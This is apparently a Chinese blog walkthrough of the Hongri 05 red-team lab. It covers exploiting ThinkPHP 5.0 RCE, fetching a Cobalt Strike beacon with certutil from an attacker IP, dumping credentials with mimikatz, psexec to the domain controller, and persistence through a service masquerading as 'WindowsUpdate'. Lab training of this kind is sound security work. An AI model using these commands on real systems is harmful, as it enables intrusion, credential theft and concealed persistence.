---
title: "红日靶场05"
date: 2025-12-11T00:00:00+08:00
draft: false

---

# 红日靶场05

### 环境搭建

这次的靶机网卡是配置好的，非常贴心

只需要我们在虚拟网络编辑器中将NAT模式的网卡IP改为`192.168.135.0`即可完成网络配置

接下来直接开机即可

服务器账号密码信息：

| 主机    | 账号              | 密码      |
| ------- | ----------------- | --------- |
| win7    | sun\heart         | 123.com   |
| win7    | sun\Administrator | dc123.com |
| win2008 | sun\admin         | 2020.com  |

因为登录主机后会提示密码过期，所以我们更改一下密码

* **win7：** sun\Administrator:Admin12345
* **win2008：** sun\admin:2024.com

这里只需要用sun\Administrator登录到win7服务器手动开启web服务：
在`C:\phpstudy`中双击运行phpstudy.exe，并在phpstudy中点击"启动"即可：

![image-20240808152418634](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240808152420007-701299660.png)

然后访问一下`192.168.135.150`看下web服务是否启动成功：

![image-20240808153238038](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240808153238427-1332546036.png)

OK成功了，准备开打

### 信息搜集

扫一下端口：

![image-20240808155639768](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240808155640468-465849453.png)

开启了80端口和3306端口，也就是web服务和MySQL数据库服务

先看看web服务

![image-20240808160350642](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240808160351655-767252501.png)

服务器是windows系统，是ThinkPHP V5.0服务

### 漏洞利用

#### ThinkPHP V5.0命令执行getshell

记得ThinkPHP V5.0有很多历史漏洞，搜一下：

![image-20240808160755270](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240808160758884-805049799.png)

可以RCE，直接复制payload试试：

![image-20240808160824713](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240808160825020-190312969.png)

成功RCE了，而且是admin权限，ping一下公网DNS看看能否出网：

![image-20240808161338140](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240808161338477-983266943.png)

OK，该主机可以正常出网，那么先尝试一下上线CS

#### 上传exe上线CS

就是生成exe并上传执行即可上线，生成exe过程不做赘述

通过如下命令进行下载exe：

~~~cmd
certutil.exe -urlcache -split -f http://192.168.135.128/beacon.exe
~~~

![image-20240808164736594](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240808164737302-911996331.png)

执行完毕，dir看看成功没：

![image-20240808164837304](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240808164837484-1858151328.png)

ok下载成功了，接下来启动exe即可上线

![image-20240808165004487](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240808165004625-1384804727.png)

ok成功上线了

### 后渗透

因为当前shell的身份是admin，所以先用mimikatz试试抓取密码

![image-20240808170900915](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240808170901169-102079417.png)

抓取到了sun.com域管理Administrator的明文密码：Admin12345

接下来就可以进行内网信息搜集：

#### 内网信息搜集

使用port scan扫描内网网段：

![image-20240808172755862](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240808172756288-1150628883.png)

发现第二台主机`192.168.138.138`

先ping一下sun.com确定一下DNS服务器：

![image-20240808173306893](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240808173307130-1612743757.png)

基本可以确定`192.168.138.138`是域控服务器

#### 横向移动

##### psexec64连接域控

直接用mimikatz抓取到的凭证进行psexec横向移动：

![image-20240808173922946](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240808173923106-602758878.png)

这里launch成功但是并没有获得会话，好像是因为payload用成反向连接的了

因为port scan扫出来两台主机均开启了445端口，所以用SMB的正向payload试试：

![image-20240808174918241](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240808174918712-973993000.png)

直接连上了：

![image-20240808175046640](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240808175046703-851514490.png)

还是system权限：

![image-20240808175223809](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240808175223749-1063564820.png)

至此，成功获取两台主机的控制权限，接下来进行权限维持

#### 权限维持

没有什么值得说的，直接把我们先前上传的exe写入自启动服务，并且创建的自启动服务命名为系统更新服务：

~~~shell
shell sc create "WindowsUpdate" binpath= "cmd /c start "C:\phpStudy\PHPTutorial\WWW\public\beacon.exe""&&sc config "WindowsUpdate" start= auto&&net start WindowsUpdate
~~~

（当然这里可以将exe移动到更隐蔽的路径）

写入后，甚至立即获取了一个system权限：

![image-20240808181907062](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240808181907651-558351494.png)

如此，即使该主机重启也可自动会连CS，且权限为SYSTEM

### 总结

总结一下此次实践中用到的知识点和操作方法

* ThinkPHP V5.0命令执行漏洞利用
* 利用windows自带的工具certutil下载远程恶意文件至主机
* 用mimikatz抓取的凭证来psexec横向移动控制DC
* 创建自启动服务实现权限维持